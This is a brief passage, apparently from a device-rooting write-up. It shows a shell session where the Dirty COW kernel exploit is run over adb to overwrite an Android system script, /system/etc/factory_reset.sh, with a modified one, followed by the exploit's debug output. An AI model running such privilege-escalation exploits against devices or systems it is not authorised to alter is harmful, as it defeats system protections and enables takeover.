`/system/etc/factory_reset.sh` was backed up just before:

```
root@4eca02283758:/2016PilotOneClick# adb shell '/data/local/tmp/rootme/dirtycow /system/etc/factory_reset.sh /data/local/tmp/rootme/factory_reset_mod.sh'
warning: new file size (60) and file old size (3417) differ

size 3417


[*] mmap 0x4024b000
[*] exploit (patch)
[*] currently 0x4024b000=732f2123
[*] madvise = 0x4024b000 3417
[*] madvise = 0 1048576
[*] /proc/self/mem -711983104 1048576
[*] exploited 0x4024b000=732f2123
```
